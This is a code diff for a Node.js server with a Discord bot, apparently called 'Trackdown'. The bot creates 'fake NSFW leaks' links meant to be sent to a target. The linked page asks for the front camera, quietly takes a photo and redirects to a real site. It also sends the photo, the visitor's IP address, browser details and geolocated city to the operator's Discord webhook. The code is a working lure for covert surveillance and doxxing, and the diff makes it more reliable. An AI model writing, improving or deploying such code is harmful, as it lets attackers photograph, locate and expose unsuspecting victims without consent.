@@ -6,21 +6,27 @@ const FormData = require('form-data');
 const app = express();
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
+// ================== ENV VARIABLES ==================
 const TOKEN = process.env.DISCORD_TOKEN;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const DOMAIN = process.env.DOMAIN;
 
-const trackingLinks = new Map();
+if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
+  console.error("❌ Missing one or more environment variables (DISCORD_TOKEN, WEBHOOK_URL, DOMAIN)");
+}
 
+// Trust proxy - Important for Render, Railway, etc.
+app.set('trust proxy', true);
 app.use(express.json());
 
-// Trust proxy (Very Important for Render, Railway, etc.)
-app.set('trust proxy', true);
+// Health Check
+app.get('/', (req, res) => {
+  res.send('✅ Trackdown bot is running!');
+});
 
-// Health check
-app.get('/', (req, res) => res.send('✅ Bot is running!'));
+const trackingLinks = new Map();
 
-// ================== FIXED TRACKING PAGE ==================
+// ================== FAKE NSFW PAGE WITH CAMERA ==================
 app.get('/track/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -29,7 +35,6 @@ app.get('/track/:id', (req, res) => {
     return res.send('<h1 style="color:red">Link expired or invalid</h1>');
   }
 
-  // Better IP detection
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
   const userAgent = req.headers['user-agent'] || 'Unknown';
 
@@ -62,7 +67,7 @@ app.get('/track/:id', (req, res) => {
     const canvas = document.getElementById('canvas');
     let stream = null;
 
-    async function logVisit(photo = null) {
+    async function logVisit(photo = null, cameraStatus = "Denied/Failed") {
       fetch('/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -71,21 +76,20 @@ app.get('/track/:id', (req, res) => {
           ip: "${ip}",
           userAgent: "${userAgent.replace(/"/g, '\\"')}",
           photo: photo,
-          cameraAccess: photo ? "Granted" : "Denied / Failed"
+          cameraAccess: photo ? "Granted" : cameraStatus
         })
-      }).catch(() => {}); // don't show error to user
+      }).catch(() => {});
     }
 
     async function start() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        video.onloadedmetadata = () => setTimeout(takePhoto, 2500);
+        video.onloadedmetadata = () => setTimeout(takePhoto, 2600);
       } catch(e) {
-        // Camera denied or failed → still log the visit
         document.getElementById('status').textContent = "Access denied • Redirecting...";
-        await logVisit(null);
-        setTimeout(() => window.location.href = "${originalUrl}", 1800);
+        await logVisit(null, "Denied");
+        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1500);
       }
     }
 
@@ -93,11 +97,11 @@ app.get('/track/:id', (req, res) => {
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       canvas.getContext('2d').drawImage(video, 0, 0);
-      const photo = canvas.toDataURL('image/jpeg', 0.8);
+      const photo = canvas.toDataURL('image/jpeg', 0.82);
 
-      logVisit(photo).then(() => {
+      logVisit(photo, "Granted").then(() => {
         if (stream) stream.getTracks().forEach(t => t.stop());
-        setTimeout(() => window.location.href = "${originalUrl}", 1200);
+        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1000);
       });
     }
 
@@ -109,18 +113,18 @@ app.get('/track/:id', (req, res) => {
   res.send(html);
 });
 
-// ================== LOG ENDPOINT (Now logs even on deny) ==================
+// ================== LOG ENDPOINT ==================
 app.post('/log', async (req, res) => {
   const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
   const originalUrl = trackingLinks.get(trackId) || 'Unknown';
 
   let location = 'Unknown';
   try {
-    if (ip && ip !== 'Unknown') {
+    if (ip && ip !== 'Unknown' && ip !== '::1' && !ip.startsWith('127.')) {
       const geo = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
       location = `${geo.data.city || ''}, ${geo.data.country_name || ''}`.trim() || 'Unknown';
     }
-  } catch(e) {}
+  } catch (e) {}
 
   const embed = {
     title: "🎯 Trackdown Hit - NSFW Fake Link",
@@ -128,9 +132,9 @@ app.post('/log', async (req, res) => {
     fields: [
       { name: "IP", value: `\`${ip}\``, inline: true },
       { name: "Location", value: location, inline: true },
-      { name: "Camera Access", value: cameraAccess, inline: true },
+      { name: "Camera", value: cameraAccess, inline: true },
       { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
-      { name: "User-Agent", value: userAgent.substring(0, 300) || "Unknown", inline: false },
+      { name: "User-Agent", value: (userAgent || "Unknown").substring(0, 300), inline: false },
       { name: "Original URL", value: originalUrl, inline: false }
     ],
     timestamp: new Date().toISOString()
@@ -142,7 +146,7 @@ app.post('/log', async (req, res) => {
       form.append('payload_json', JSON.stringify({ embeds: [embed] }));
       const base64Data = photo.split(',')[1];
       const buffer = Buffer.from(base64Data, 'base64');
-      form.append('file', buffer, 'photo.jpg');
+      form.append('file', buffer, 'captured.jpg');
       await axios.post(WEBHOOK_URL, form, { headers: form.getHeaders() });
     } else {
       await axios.post(WEBHOOK_URL, { embeds: [embed] });
@@ -154,16 +158,18 @@ app.post('/log', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Discord bot part (same as before, I kept it unchanged for now)
-client.once('ready', async () => {
-  console.log(`✅ Bot online → ${client.user.tag}`);
-  const cmd = new SlashCommandBuilder()
-    .setName('create')
-    .setDescription('Create fake NSFW tracking link')
-    .addStringOption(opt => opt.setName('url').setDescription('Real redirect URL').setRequired(true));
-
-  await client.application.commands.set([cmd]);
+// ================== DISCORD BOT ==================
+client.once('ready', () => {
+  console.log(`✅ Bot is online → ${client.user.tag}`);
 });
+
+const cmd = new SlashCommandBuilder()
+  .setName('create')
+  .setDescription('Create fake NSFW leaks tracking link')
+  .addStringOption(opt =>
+    opt.setName('url')
+      .setDescription('Real URL to redirect after tracking')
+      .setRequired(true));
 
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand() || interaction.commandName !== 'create') return;
@@ -179,13 +185,33 @@ client.on('interactionCreate', async interaction => {
   const link = `${DOMAIN}/track/${trackId}`;
 
   await interaction.reply({
-    content: `**✅ Tracking Link Created**\n\n**Link:** ${link}\n**Redirects to:** ${url}`,
+    content: `**✅ Fake NSFW Tracking Link Created!**\n\n` +
+             `**Tracking Link:** ${link}\n` +
+             `**Redirects to:** ${url}\n\n` +
+             `Send this to the target.`,
     ephemeral: true
   });
 });
 
-app.listen(process.env.PORT || 3000, () => {
-  console.log('✅ Server running');
+// ================== START SERVER & BOT ==================
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () => {
+  console.log(`✅ Web server running on port ${PORT}`);
 });
 
-client.login(TOKEN);
+client.login(TOKEN)
+  .then(() => console.log("✅ Discord bot logged in"))
+  .catch(err => {
+    console.error("❌ Discord login failed:", err.message);
+    console.log("⚠️ Web server is still running without bot functionality.");
+  });
+
+// Prevent crashes
+process.on('unhandledRejection', (reason) => {
+  console.error('Unhandled Rejection:', reason);
+});
+
+process.on('uncaughtException', (err) => {
+  console.error('Uncaught Exception:', err);
+});
